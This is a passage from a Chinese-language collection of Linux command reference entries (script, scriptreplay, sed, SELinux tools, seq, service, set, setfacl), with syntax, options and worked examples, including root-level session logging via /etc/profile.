20:48:46\nzfb@localhost:~$ echo \"Bye\"\nBye\nzfb@localhost:~$ ls -al\ntotal 20\ndrwxr-xr-x  2 zfb zfb 4096 Dec 23 20:48 .\ndrwxr-xr-x 37 zfb zfb 4096 Dec 23 20:49 ..\n-rw-r--r--  1 zfb zfb    0 Dec 23 19:03 a.txt\n-rw-r--r--  1 zfb zfb   12 Dec 23 19:04 b.txt\n-rw-r--r--  1 zfb zfb 2744 Dec 23 20:49 command.log\n-rw-r--r--  1 zfb zfb  790 Dec 23 20:49 time.file\nzfb@localhost:~$ exit\n\nScript done on 2020-12-23 20:49:04+08:00 [COMMAND_EXIT_CODE=\"0\"]\nzfb@localhost:~$\n```\n\n其中，只有命令`cat command.log`是用户输入，其他均为自动呈现。通过查看上面输出的时间`2020-12-23 20:48:46`，可以证明，这是重现的记录，而非重新执行一遍命令。也就是说，可以把`time.file`和`command.log`文件移动到任意一台机器上，都可以重现命令输入与终端回显。\n\n **记录服务器用户会话操作** \n\n以`root`身份编辑文件`/etc/profile`，在文件末尾追加以下内容\n\n```bash\nif [ $UID -ge 0 ]\nthen\n    exec /usr/bin/script -t 2>/var/log/script-records/$USER-$UID-`date +%Y%m%d`.time -a -f -q /var/log/script-records/$USER-$UID-`date +%Y%m%d`.log\nfi\n```\n\n然后再以`root`身份创建文件夹用于存储服务器上的各个用户在终端的所有操作信息\n\n```bash\nsudo mkdir -p /var/log/script-records/\nsudo chmod 733 /var/log/script-records/\n```\n\n最后，执行命令`source /etc/profile`即可。任意用户（`UID ≥ 0`）在终端执行的所有操作都会被安静地记录下来，以天为单位存储。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","script"]},{"title":"【Linux 命令】scriptreplay","url":"/linux-command/scriptreplay/","content":"\n重新播放终端会话的所有操作\n\n## 补充说明\n\n**scriptreplay** 用于在终端中，根据 `script` 命令记录的终端数据文件和时间日志文件，重现当时用户的所有操作和命令的输出信息。简而言之，重现播放当时终端会话发生的一切信息，而不是重新运行一遍命令。例如，用户当时在输入某条命令时，字符的键入和删除也都会被重现。非常适合用于教程演示场合。而且，在机器 A 上面使用 `script` 命令记录终端操作，可以在机器 B 上面使用 `scriptreplay` 命令重新播放。\n\n\n###  语法\n\n```shell\nscriptreplay [options] [-t] timingfile [typescript [divisor]]\n```\n\n###  选项\n\n```shell\n-t, --timing file         # 记录时间日志的文件名称\n-s, --typescript file     # 记录终端数据信息的日志文件名称\n-d, --divisor number      # 表示倍速播放，把时间日志文件记录的时间间隔都除以 number\n                          # -d 2 表示播放速度是原始输入单条命令的速度的两倍，-d 0.1 表示播放单条命令的速度减慢 10 倍\n-m, --maxdelay number     # 表示命令之间的最大延迟时间（单位是秒）\n                          # -m 2 表示 command.log 中存放的两条命令之间的间隔时间如果大于两秒，则按两秒执行播放\n-V, --version             # 显示版本信息并退出\n-h, --help                # 显示帮助文本并退出\n```\n\n###  参数\n\n* 时间日志文件：存储时间日志信息的文件名称\n* 终端数据文件：存储终端数据信息的文件名称\n\n###  实例\n\n```shell\n# 重新播放终端内容，默认第一个参数是时间日志，第二个参数是终端数据文件\nscriptreplay time.file command.log\n# 重新播放终端内容，播放快进速度为 1 ，命令之间最大延时为 2 秒\nscriptreplay -d 1 -m 2 -t time.file -s command.log\n```\n\n **记录终端内容到文件** \n\n```shell\nzfb@localhost:~$ script -t 2>time.file -a -f command.log\nScript started, file is command.log\nzfb@localhost:~$ echo \"hello, world\"\nhello, world\nzfb@localhost:~$ echo $(date \"+%Y-%m-%d %H:%M:%S\")\n2020-12-23 20:48:46\nzfb@localhost:~$ echo \"Bye\"\nBye\nzfb@localhost:~$ ls -al\ntotal 20\ndrwxr-xr-x  2 zfb zfb 4096 Dec 23 20:48 .\ndrwxr-xr-x 37 zfb zfb 4096 Dec 23 20:49 ..\n-rw-r--r--  1 zfb zfb    0 Dec 23 19:03 a.txt\n-rw-r--r--  1 zfb zfb   12 Dec 23 19:04 b.txt\n-rw-r--r--  1 zfb zfb 2744 Dec 23 20:49 command.log\n-rw-r--r--  1 zfb zfb  790 Dec 23 20:49 time.file\nzfb@localhost:~$ exit\nScript done, file is command.log\nzfb@localhost:~$\n```\n\n **重新播放终端内容** \n\n```shell\nzfb@localhost:~$ scriptreplay -d 1 -m 2 -t time.file -s command.log\nzfb@localhost:~$ echo \"hello, world\"\nhello, world\nzfb@localhost:~$ echo $(date \"+%Y-%m-%d %H:%M:%S\")\n2020-12-23 20:48:46\nzfb@localhost:~$ echo \"Bye\"\nBye\nzfb@localhost:~$ ls -al\ntotal 20\ndrwxr-xr-x  2 zfb zfb 4096 Dec 23 20:48 .\ndrwxr-xr-x 37 zfb zfb 4096 Dec 23 20:49 ..\n-rw-r--r--  1 zfb zfb    0 Dec 23 19:03 a.txt\n-rw-r--r--  1 zfb zfb   12 Dec 23 19:04 b.txt\n-rw-r--r--  1 zfb zfb 2744 Dec 23 20:49 command.log\n-rw-r--r--  1 zfb zfb  790 Dec 23 20:49 time.file\nzfb@localhost:~$ exit\n\nzfb@localhost:~$\n```\n\n其中，只有命令`scriptreplay -d 1 -m 2 -t time.file -s command.log`是用户输入，其他均为自动呈现（且视觉效果与真实用户的操作一致）。通过查看上面输出的时间`2020-12-23 20:48:46`，可以证明，这是重新播放当时的记录，而非重新执行一遍命令。也就是说，可以把`time.file`和`command.log`文件移动到任意一台支持`scriptreplay`命令的机器上，都可以动态重现命令输入与终端回显。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","scriptreplay"]},{"title":"【Linux 命令】sed","url":"/linux-command/sed/","content":"\n功能强大的流式文本编辑器\n\n## 补充说明\n\n**sed** 是一种流编辑器，它是文本处理中非常重要的工具，能够完美的配合正则表达式使用，功能不同凡响。处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有 改变，除非你使用重定向存储输出。Sed主要用来自动编辑一个或多个文件；简化对文件的反复操作；编写转换程序等。\n\n## sed的选项、命令、替换标记  \n\n **命令格式** \n\n```shell\nsed [options] 'command' file(s)\nsed [options] -f scriptfile file(s)\n```\n\n###  选项 \n\n```shell\n-e<script>或--expression=<script>：以选项中的指定的script来处理输入的文本文件；\n-f<script文件>或--file=<script文件>：以选项中指定的script文件来处理输入的文本文件；\n-h或--help：显示帮助；\n-n或--quiet或——silent：仅显示script处理后的结果；\n-V或--version：显示版本信息。\n```\n\n###  参数 \n\n文件：指定待处理的文本文件列表。\n\n###  sed命令 \n\n```shell\na\\ # 在当前行下面插入文本。\ni\\ # 在当前行上面插入文本。\nc\\ # 把选定的行改为新的文本。\nd # 删除，删除选择的行。\nD # 删除模板块的第一行。\ns # 替换指定字符\nh # 拷贝模板块的内容到内存中的缓冲区。\nH # 追加模板块的内容到内存中的缓冲区。\ng # 获得内存缓冲区的内容，并替代当前模板块中的文本。\nG # 获得内存缓冲区的内容，并追加到当前模板块文本的后面。\nl # 列表不能打印字符的清单。\nn # 读取下一个输入行，用下一个命令处理新的行而不是用第一个命令。\nN # 追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码。\np # 打印模板块的行。\nP # (大写) 打印模板块的第一行。\nq # 退出Sed。\nb lable # 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾。\nr file # 从file中读行。\nt label # if分支，从最后一行开始，条件一旦满足或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。\nT label # 错误分支，从最后一行开始，一旦发生错误或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。\nw file # 写并追加模板块到file末尾。  \nW file # 写并追加模板块的第一行到file末尾。  \n! # 表示后面的命令对所有没有被选定的行发生作用。  \n= # 打印当前行号码。  \n# # 把注释扩展到下一个换行符以前。  \n```\n\n###  sed替换标记 \n\n```shell\ng # 表示行内全面替换。  \np # 表示打印行。  \nw # 表示把行写入一个文件。  \nx # 表示互换模板块中的文本和缓冲区中的文本。  \ny # 表示把一个字符翻译为另外的字符（但是不用于正则表达式）\n\\1 # 子串匹配标记\n& # 已匹配字符串标记\n```\n\n###  sed元字符集 \n\n```shell\n^ # 匹配行开始，如：/^sed/匹配所有以sed开头的行。\n$ # 匹配行结束，如：/sed$/匹配所有以sed结尾的行。\n. # 匹配一个非换行符的任意字符，如：/s.d/匹配s后接一个任意字符，最后是d。\n* # 匹配0个或多个字符，如：/*sed/匹配所有模板是一个或多个空格后紧跟sed的行。\n[] # 匹配一个指定范围内的字符，如/[sS]ed/匹配sed和Sed。  \n[^] # 匹配一个不在指定范围内的字符，如：/[^A-RT-Z]ed/匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行。\n\\(..\\) # 匹配子串，保存匹配的字符，如s/\\(love\\)able/\\1rs，loveable被替换成lovers。\n& # 保存搜索字符用来替换其他字符，如s/love/ **&** /，love这成 **love** 。\n\\< # 匹配单词的开始，如:/\\<love/匹配包含以love开头的单词的行。\n\\> # 匹配单词的结束，如/love\\>/匹配包含以love结尾的单词的行。\nx\\{m\\} # 重复字符x，m次，如：/0\\{5\\}/匹配包含5个0的行。\nx\\{m,\\} # 重复字符x，至少m次，如：/0\\{5,\\}/匹配至少有5个0的行。\nx\\{m,n\\} # 重复字符x，至少m次，不多于n次，如：/0\\{5,10\\}/匹配5~10个0的行。  \n```\n\n## sed用法实例  \n\n###  替换操作：s命令 \n\n替换文本中的字符串：\n\n```shell\nsed 's/book/books/' file\n```\n\n **-n选项** 和 **p命令** 一起使用表示只打印那些发生替换的行：\n\nsed -n 's/test/TEST/p' file\n\n直接编辑文件 **选项-i** ，会匹配file文件中每一行的所有book替换为books：\n\n```shell\nsed -i 's/book/books/g' file\n```\n\n###  全面替换标记g \n\n使用后缀 /g 标记会替换每一行中的所有匹配：\n\n```shell\nsed 's/book/books/g' file\n```\n\n当需要从第N处匹配开始替换时，可以使用 /Ng：\n\n```shell\necho sksksksksksk | sed 's/sk/SK/2g'\nskSKSKSKSKSK\n\necho sksksksksksk | sed 's/sk/SK/3g'\nskskSKSKSKSK\n\necho sksksksksksk | sed 's/sk/SK/4g'\nskskskSKSKSK\n```\n\n###  定界符 \n\n以上命令中字符 / 在sed中作为定界符使用，也可以使用任意的定界符：\n\n```shell\nsed 's:test:TEXT:g'\nsed 's|test|TEXT|g'\n```\n\n定界符出现在样式内部时，需要进行转义：\n\n```shell\nsed 's/\\/bin/\\/usr\\/local\\/bin/g'\n```\n\n###  删除操作：d命令 \n\n删除空白行：\n\n```shell\nsed '/^$/d' file\n```\n\n删除文件的第2行：\n\n```shell\nsed '2d' file\n```\n\n删除文件的第2行到末尾所有行：\n\n```shell\nsed '2,$d' file\n```\n\n删除文件最后一行：\n\n```shell\nsed '$d' file\n```\n\n删除文件中所有开头是test的行：\n\n```shell\nsed '/^test/'d file\n```\n\n###  已匹配字符串标记& \n\n正则表达式 \\w\\+ 匹配每一个单词，使用 [&] 替换它，& 对应于之前所匹配到的单词：\n\n```shell\necho this is a test line | sed 's/\\w\\+/[&]/g'\n[this] [is] [a] [test] [line]\n```\n\n所有以192.168.0.1开头的行都会被替换成它自已加localhost：\n\n```shell\nsed 's/^192.168.0.1/&localhost/' file\n192.168.0.1localhost\n```\n\n###  子串匹配标记\\1 \n\n匹配给定样式的其中一部分：\n\n```shell\necho this is digit 7 in a number | sed 's/digit \\([0-9]\\)/\\1/'\nthis is 7 in a number\n```\n\n命令中 digit 7，被替换成了 7。样式匹配到的子串是 7，\\(..\\) 用于匹配子串，对于匹配到的第一个子串就标记为  **\\1** ，依此类推匹配到的第二个结果就是  **\\2** ，例如：\n\n```shell\necho aaa BBB | sed 's/\\([a-z]\\+\\) \\([A-Z]\\+\\)/\\2 \\1/'\nBBB aaa\n```\n\nlove被标记为1，所有loveable会被替换成lovers，并打印出来：\n\n```shell\nsed -n 's/\\(love\\)able/\\1rs/p' file\n```\n\n###  组合多个表达式 \n\n```shell\nsed '表达式' | sed '表达式'\n\n等价于：\n\nsed '表达式; 表达式'\n```\n\n###  引用 \n\nsed表达式可以使用单引号来引用，但是如果表达式内部包含变量字符串，就需要使用双引号。\n\n```shell\ntest=hello\necho hello WORLD | sed \"s/$test/HELLO\"\nHELLO WORLD\n```\n\n###  选定行的范围：,（逗号） \n\n所有在模板test和check所确定的范围内的行都被打印：\n\n```shell\nsed -n '/test/,/check/p' file\n```\n\n打印从第5行开始到第一个包含以test开始的行之间的所有行：\n\n```shell\nsed -n '5,/^test/p' file\n```\n\n对于模板test和west之间的行，每行的末尾用字符串aaa bbb替换：\n\n```shell\nsed '/test/,/west/s/$/aaa bbb/' file\n```\n\n###  多点编辑：e命令 \n\n-e选项允许在同一行里执行多条命令：\n\n```shell\nsed -e '1,5d' -e 's/test/check/' file\n```\n\n上面sed表达式的第一条命令删除1至5行，第二条命令用check替换test。命令的执行顺序对结果有影响。如果两个命令都是替换命令，那么第一个替换命令将影响第二个替换命令的结果。\n\n和 -e 等价的命令是 --expression：\n\n```shell\nsed --expression='s/test/check/' --expression='/love/d' file\n```\n\n###  从文件读入：r命令 \n\nfile里的内容被读进来，显示在与test匹配的行后面，如果匹配多行，则file的内容将显示在所有匹配行的下面：\n\n```shell\nsed '/test/r file' filename\n```\n\n###  写入文件：w命令   \n\n在example中所有包含test的行都被写入file里：\n\n```shell\nsed -n '/test/w file' example\n```\n\n###  追加（行下）：a\\命令 \n\n将 this is a test line 追加到 以test 开头的行后面：\n\n```shell\nsed '/^test/a\\this is a test line' file\n```\n\n在 test.conf 文件第2行之后插入 this is a test line：\n\n```shell\nsed -i '2a\\this is a test line' test.conf\n```\n\n###  插入（行上）：i\\命令 \n\n将 this is a test line 追加到以test开头的行前面：\n\n```shell\nsed '/^test/i\\this is a test line' file\n```\n\n在test.conf文件第5行之前插入this is a test line：\n\n```shell\nsed -i '5i\\this is a test line' test.conf\n```\n\n###  下一个：n命令 \n\n如果test被匹配，则移动到匹配行的下一行，替换这一行的aa，变为bb，并打印该行，然后继续：\n\n```shell\nsed '/test/{ n; s/aa/bb/; }' file\n```\n\n###  变形：y命令 \n\n把1~10行内所有abcde转变为大写，注意，正则表达式元字符不能使用这个命令：\n\n```shell\nsed '1,10y/abcde/ABCDE/' file\n```\n\n###  退出：q命令 \n\n打印完第10行后，退出sed\n\n```shell\nsed '10q' file\n```\n\n###  保持和获取：h命令和G命令 \n\n在sed处理文件的时候，每一行都被保存在一个叫模式空间的临时缓冲区中，除非行被删除或者输出被取消，否则所有被处理的行都将 打印在屏幕上。接着模式空间被清空，并存入新的一行等待处理。\n\n```shell\nsed -e '/test/h' -e '$G' file\n```\n\n在这个例子里，匹配test的行被找到后，将存入模式空间，h命令将其复制并存入一个称为保持缓存区的特殊缓冲区内。第二条语句的意思是，当到达最后一行后，G命令取出保持缓冲区的行，然后把它放回模式空间中，且追加到现在已经存在于模式空间中的行的末尾。在这个例子中就是追加到最后一行。简单来说，任何包含test的行都被复制并追加到该文件的末尾。\n\n###  保持和互换：h命令和x命令 \n\n互换模式空间和保持缓冲区的内容。也就是把包含test与check的行互换：\n\n```shell\nsed -e '/test/h' -e '/check/x' file\n```\n\n###  脚本scriptfile \n\nsed脚本是一个sed的命令清单，启动Sed时以-f选项引导脚本文件名。Sed对于脚本中输入的命令非常挑剔，在命令的末尾不能有任何空白或文本，如果在一行中有多个命令，要用分号分隔。以#开头的行为注释行，且不能跨行。\n\n```shell\nsed [options] -f scriptfile file(s)\n```\n\n###  打印奇数行或偶数行 \n\n方法1：\n\n```shell\nsed -n 'p;n' test.txt  #奇数行\nsed -n 'n;p' test.txt  #偶数行\n```\n\n方法2：\n\n```shell\nsed -n '1~2p' test.txt  #奇数行\nsed -n '2~2p' test.txt  #偶数行\n```\n\n###  打印匹配字符串的下一行 \n\n```shell\ngrep -A 1 SCC URFILE\nsed -n '/SCC/{n;p}' URFILE\nawk '/SCC/{getline; print}' URFILE\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sed"]},{"title":"【Linux 命令】seinfo","url":"/linux-command/seinfo/","content":"\n查询SELinux的策略提供多少相关规则\n\n## 补充说明\n\n**seinfo命令** 是用来查询SELinux的策略提供多少相关规则，一个主体进程能否读取到目标文件资源的重点是在于SELinux的策略以及策略内的各项规则，然后再通过该规则的定义去处理各项目标文件的安全上下文，尤其是“类型”部分。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。\n\n###  语法\n\n```shell\nseinfo（选项）\n```\n\n###  选项\n\n```shell\n-A：列出SELinux的状态、规则布尔值、身份识别、角色、类型等所有信息。\n-t：列出SELinux所有类型(type)的种类。\n-r：列出SELinux所有角色(role)的种类。\n-u：列出SELinux所有身份识别(user)的种类。\n-b：列出所有规则的种类（布尔值）。\n```\n\n###  实例\n\n列出与httpd有关的规则：\n\n```shell\nseinfo -b | grep httpd\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","seinfo"]},{"title":"【Linux 命令】semanage","url":"/linux-command/semanage/","content":"\n默认目录的安全上下文查询与修改\n\n## 补充说明\n\n**semanage命令** 是用来查询与修改SELinux默认目录的安全上下文。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。\n\n###  语法\n\n```shell\nsemanage {login|user|port|interface|fcontext|translation} -l\nsemanage fcontext -{a|d|m} [-frst] file_spec\n```\n\n###  选项\n\n```shell\n-l：查询。\nfcontext：主要用在安全上下文方面。\n-a：增加，你可以增加一些目录的默认安全上下文类型设置。\n-m：修改。\n-d：删除。\n```\n\n###  实例\n\n查询一下`/var/www/html`的默认安全性本文的设置：\n\n```shell\nsemanage fcontext -l\nSELinux fcontext    type          Context\n....(前面省略)....\n/var/www(/.*)?      all files     system_u:object_r:httpd_sys_content_t:s0\n....(後面省略)....\n```\n\n如上面例子所示，我们可以查询的到每个目录的安全性本文！而目录的设定可以使用正则表达式去指定一个范围。那么如果我们想要增加某些自定义目录的安全性本文呢？举例来说，我想要色设置`/srv/samba`成为 `public_content_t`的类型时，应该如何设置呢？\n\n用semanage命令设置`/srv/samba`目录的默认安全性本文为`public_content_t`：\n\n```shell\nmkdir /srv/samba\nll -Zd /srv/samba\ndrwxr-xr-x  root root root:object_r:var_t    /srv/samba\n```\n\n如上所示，默认的情况应该是`var_t`这个咚咚的！\n\n```shell\nsemanage fcontext -l | grep '/srv'\n/srv/.*                     all files   system_u:object_r:var_t:s0\n/srv/([^/]*/)?ftp(/.*)?     all files   system_u:object_r:public_content_t:s0\n/srv/([^/]*/)?www(/.*)?     all files   system_u:object_r:httpd_sys_content_t:s0\n/srv/([^/]*/)?rsync(/.*)?   all files   system_u:object_r:public_content_t:s0\n/srv/gallery2(/.*)?         all files   system_u:object_r:httpd_sys_content_t:s0\n/srv                        directory   system_u:object_r:var_t:s0   //看这里！\n```\n\n上面则是默认的`/srv`底下的安全性本文资料，不过，并没有指定到`/srv/samba`。\n\n```shell\nsemanage fcontext -a -t public_content_t \"/srv/samba(/.*)?\"\nsemanage fcontext -l | grep '/srv/samba'\n/srv/samba(/.*)?            all files   system_u:object_r:public_content_t:s0\n```\n\n```shell\ncat /etc/selinux/targeted/contexts/files/file_contexts.local\n# This file is auto-generated by libsemanage\n# Please use the semanage command to make changes\n/srv/samba(/.*)?    system_u:object_r:public_content_t:s0  #写入这个档案\n```\n\n```shell\nrestorecon -Rv /srv/samba* #尝试恢复默认值\nll -Zd /srv/samba\ndrwxr-xr-x  root root system_u:object_r:public_content_t /srv/samba/  #有默认值，以后用restorecon命令来修改比较简单！\n```\n\nsemanage命令的功能很多，这里主要用到的仅有fcontext这个选项的用法而已。如上所示，你可以使用semanage来查询所有的目录默认值，也能够使用它来增加默认值的设置！\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","semanage"]},{"title":"【Linux 命令】sendmail","url":"/linux-command/sendmail/","content":"\n著名电子邮件服务器\n\n## 补充说明\n\n**sendmail命令** 是一款著名的电子邮件传送代理程序，也就是平常说的电子邮件服务器，它基于标准的简单邮件传输协议（SMTP）。\n\n### 语法\n\n```shell\nsendmail(选项)\n```\n\n### 选项\n\n```shell\n-bd：以守护进程方式运行指令；\n-bD：以前台运行方式运行；\n-bi：初始化别名数据库；\n-bm：以常规发送电子邮件；\n-bp：显示邮件的发送队列；\n-C：指定配置文件；\n-D：将调试的输出信息保存到日志文件，而不显示在标准输出设备上；\n-F：指定邮件发送者全名；\n-n：禁止使用邮件别名功能；\n-f：指定发件人的名字；\n-q：设置处理邮件队列中邮件的时间间隔。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sendmail"]},{"title":"【Linux 命令】seq","url":"/linux-command/seq/","content":"\n以指定增量从首数开始打印数字到尾数\n\n## 补充说明\n\n**seq命令** 用于产生从某个数到另外一个数之间的所有整数。\n\n###  语法\n\n```shell\nseq [选项]... 尾数\nseq [选项]... 首数 尾数\nseq [选项]... 首数 增量 尾数\n```\n\n###  选项\n\n```shell\n-f, --format=格式        使用printf 样式的浮点格式\n-s, --separator=字符串   使用指定字符串分隔数字（默认使用：\\n）\n-w, --equal-width        在列前添加0 使得宽度相同\n```\n\n###  实例\n\n **-f选项：指定格式** \n\n```shell\n#seq -f\"%3g\" 9 11\n9\n10\n11\n```\n\n`%`后面指定数字的位数 默认是`%g`，`%3g`那么数字位数不足部分是空格。\n\n```shell\n#sed -f\"%03g\" 9 11\n#seq -f\"str%03g\" 9 11\nstr009\nstr010\nstr011\n```\n\n这样的话数字位数不足部分是0，`%`前面制定字符串。\n\n **-w选项：指定输出数字同宽** \n\n```shell\nseq -w 98 101\n098\n099\n100\n101\n```\n\n不能和`-f`一起用，输出是同宽的。\n\n **-s选项：指定分隔符（默认是回车）** \n\n```shell\nseq -s\" \" -f\"str%03g\" 9 11\nstr009 str010 str011\n```\n\n要指定`/t`做为分隔符号：\n\n```shell\nseq -s\"`echo -e \"/t\"`\" 9 11\n```\n\n指定`\\n`作为分隔符号：\n\n```shell\nseq -s\"`echo -e \"\\n\"`\" 9 11\n19293949596979899910911\n```\n\n得到的是个错误结果，不过一般也没有这个必要，它默认的就是回车作为分隔符。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","seq"]},{"title":"【Linux 命令】service","url":"/linux-command/service/","content":"\n控制系统服务的实用工具\n\n## 补充说明\n\n**service命令** 是Redhat Linux兼容的发行版中用来控制系统服务的实用工具，它以启动、停止、重新启动和关闭系统服务，还可以显示所有系统服务的当前状态。\n\n###  语法\n\n```shell\nservice(选项)(参数)\n```\n\n###  选项\n\n```shell\n-h：显示帮助信息；\n--status-all：显示所服务的状态。\n```\n\n###  参数\n\n*   服务名：自动要控制的服务名，即`/etc/init.d`目录下的脚本文件名；\n*   控制命令：系统服务脚本支持的控制命令。\n\n###  实例\n\n当修改了主机名、ip地址等信息时，经常需要把网络重启使之生效。\n\n```shell\nservice network status\n配置设备：\nlo eth0\n当前的活跃设备：\nlo eth0\n\nservice network restart\n正在关闭接口 eth0：                                        [  确定  ]\n关闭环回接口：                                             [  确定  ]\n设置网络参数：                                             [  确定  ]\n弹出环回接口：                                             [  确定  ]\n弹出界面 eth0：                                            [  确定  ]\n```\n\n重启mysql\n\n```shell\nservice mysqld status\nmysqld (pid 1638) 正在运行...\n\nservice mysqld restart\n停止 MySQL：                                               [  确定  ]\n启动 MySQL：                                               [  确定  ]\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","service"]},{"title":"【Linux 命令】sesearch","url":"/linux-command/sesearch/","content":"\n查询SELinux策略的规则详情\n\n## 补充说明\n\n使用seinfo命令可以查询SELinux的策略提供多少相关规则，如果查到的相关类型或者布尔值，想要知道详细规则时，使用 **sesearch命令** 查询。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。\n\n###  语法\n\n```shell\nsesearch [-a] [-s 主体类型] [-t 目标类型] [-b 布尔值]\n```\n\n###  选项\n\n```shell\n-a:列出该类型或布尔值的所有相关信息\n-t:后面还要接类型，例如 -t httpd_t\n-b:后面还要接布尔值的规则，例如 -b httpd_enable_ftp_server\n```\n\n###  实例\n\n找出目标文件资源类型为`httpd_sys_content_t`的有关信息：\n\n```shell\nsesearch -a -t httpd_sys_content_t\n```\n\n找出主体进程为`httpd_t`且目标文件类型为httpd相关的所有信息：\n\n```shell\nsesearch -s httpd_t -t httpd_* -a\n```\n\n查看布尔值`httpd_enable_homedirs`设置了多少规则\n\n```shell\nsesearch -b httpd_enable_homedirs -a\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sesearch"]},{"title":"【Linux 命令】set","url":"/linux-command/set/","content":"\n显示或设置shell特性及shell变量\n\n## 补充说明\n\n**set命令** 作用主要是显示系统中已经存在的shell变量，以及设置shell变量的新变量值。使用set更改shell特性时，符号\"+\"和\"-\"的作用分别是打开和关闭指定的模式。set命令不能够定义新的shell变量。如果要定义新的变量，可以使用declare命令以`变量名=值`的格式进行定义即可。\n\n###  语法\n\n```shell\nset(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：标示已修改的变量，以供输出至环境变量。\n-b：使被中止的后台程序立刻回报执行状态。\n-C：转向所产生的文件无法覆盖已存在的文件。\n-d：Shell预设会用杂凑表记忆使用过的指令，以加速指令的执行。使用-d参数可取消。\n-e：若指令传回值不等于0，则立即退出shell。\n-f：取消使用通配符。\n-h：自动记录函数的所在位置。\n-H Shell：可利用\"!\"加<指令编号>的方式来执行history中记录的指令。\n-k：指令所给的参数都会被视为此指令的环境变量。\n-l：记录for循环的变量名称。\n-m：使用监视模式。\n-n：只读取指令，而不实际执行。\n-p：启动优先顺序模式。\n-P：启动-P参数后，执行指令时，会以实际的文件或目录来取代符号连接。\n-t：执行完随后的指令，即退出shell。\n-u：当执行时使用到未定义过的变量，则显示错误信息。\n-v：显示shell所读取的输入值。\n-x：执行指令后，会先显示该指令及所下的参数。\n```\n\n###  参数\n\n取消某个set曾启动的参数。\n\n###  实例\n\n使用declare命令定义一个新的环境变量\"mylove\"，并且将其值设置为\"Visual C++\"，输入如下命令：\n\n```shell\ndeclare mylove='Visual C++'   #定义新环境变量\n```\n\n再使用set命令将新定义的变量输出为环境变量，输入如下命令：\n\n```shell\nset -a mylove                 #设置为环境变量\n```\n\n执行该命令后，将会新添加对应的环境变量。用户可以使用env命令和grep命令分别显示和搜索环境变量\"mylove\"，输入命令如下：\n\n```shell\nenv | grep mylove             #显示环境变量值\n```\n\n此时，该命令执行后，将输出查询到的环境变量值。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","set"]},{"title":"【Linux 命令】setfacl","url":"/linux-command/setfacl/","content":"\n设置文件访问控制列表\n\n## 补充说明\n\n**setfacl命令** 是用来在命令行里设置ACL（访问控制列表）。在命令行里，一系列的命令跟随以一系列的文件名。\n\n###  选项\n\n```shell\n-b,--remove-all：删除所有扩展的acl规则，基本的acl规则(所有者，群组，其他）将被保留。\n-k,--remove-default：删除缺省的acl规则。如果没有缺省规则，将不提示。\n-n，--no-mask：不要重新计算有效权限。setfacl默认会重新计算ACL mask，除非mask被明确的制定。\n--mask：重新计算有效权限，即使ACL mask被明确指定。\n-d，--default：设定默认的acl规则。\n--restore=file：从文件恢复备份的acl规则（这些文件可由getfacl -R产生）。通过这种机制可以恢复整个目录树的acl规则。此参数不能和除--test以外的任何参数一同执行。\n--test：测试模式，不会改变任何文件的acl规则，操作后的acl规格将被列出。\n-R，--recursive：递归的对所有文件及目录进行操作。\n-L，--logical：跟踪符号链接，默认情况下只跟踪符号链接文件，跳过符号链接目录。\n-P，--physical：跳过所有符号链接，包括符号链接文件。\n--version：输出setfacl的版本号并退出。\n--help：输出帮助信息。\n--：标识命令行参数结束，其后的所有参数都将被认为是文件名\n-：如果文件名是-，则setfacl将从标准输入读取文件名。\n```\n\n*   选项`-m`和`-x`后边跟以acl规则。多条acl规则以逗号(,)隔开。选项`-M`和`-X`用来从文件或标准输入读取acl规则。\n*   选项`--set`和`--set-file`用来设置文件或目录的acl规则，先前的设定将被覆盖。\n*   选项`-m(--modify)`和`-M(--modify-file)`选项修改文件或目录的acl规则。\n*   选项`-x(--remove)`和`-X(--remove-file)`选项删除acl规则。\n\n当使用-M，-X选项从文件中读取规则时，setfacl接受getfacl命令输出的格式。每行至少一条规则，以#开始的行将被视为注释。\n\n当在不支持ACLs的文件系统上使用setfacl命令时，setfacl将修改文件权限位。如果acl规则并不完全匹配文件权限位，setfacl将会修改文件权限位使其尽可能的反应acl规则，并会向standard error发送错误消息，以大于0的状态返回。\n\n **权限** \n\n文件的所有者以及有`CAP_FOWNER`的用户进程可以设置一个文件的acl。（在目前的linux系统上，root用户是唯一有`CAP_FOWNER`能力的用户）\n\n **ACL规则** \n\nsetfacl命令可以识别以下的规则格式：\n\n```shell\n[d[efault]:] [u[ser]:]uid [:perms]  指定用户的权限，文件所有者的权限（如果uid没有指定）。\n[d[efault]:] g[roup]:gid [:perms]   指定群组的权限，文件所有群组的权限（如果gid未指定）\n[d[efault]:] m[ask][:] [:perms]     有效权限掩码\n[d[efault]:] o[ther] [:perms]       其他的权限\n```\n\n恰当的acl规则被用在修改和设定的操作中，对于uid和gid，可以指定一个数字，也可指定一个名字。perms域是一个代表各种权限的字母的组合：读`-r`写`-w`执行`-x`，执行只适合目录和一些可执行的文件。pers域也可设置为八进制格式。\n\n **自动创建的规则** \n\n最初的，文件目录仅包含3个基本的acl规则。为了使规则能正常执行，需要满足以下规则。\n\n*   3个基本规则不能被删除。\n*   